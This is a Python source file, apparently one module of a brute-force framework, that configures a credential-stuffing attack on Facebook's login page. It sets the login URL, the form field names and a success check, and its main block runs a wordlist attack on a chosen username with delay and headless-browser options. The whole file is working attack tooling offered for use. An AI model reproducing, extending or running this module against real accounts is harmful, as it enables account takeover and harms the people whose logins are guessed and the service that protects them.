# -*- coding: utf-8 -*-
"""
facebook.py

    Module Name:
        facebook

    Author:
        Core Maintainers

    Description:
        Web-based module for credential stuffing Facebook
"""

import dataclasses

from brute.core.web import WebBruteforce


@dataclasses.dataclass
class Facebook(WebBruteforce):
    name = "facebook"
    address = "https://facebook.com/login"

    fields = { "username": "email", "password": "pass" }


    @property
    def success(self):
        """
        Login title should change once authenticated to the service.
        """
        return "Facebook"


if __name__ == "__main__":
    args = Facebook.parse_args()
    br = Facebook(
        username = args.username,
        wordlist = args.wordlist,
        delay = args.delay,
        headless = args.headless
    ).run()
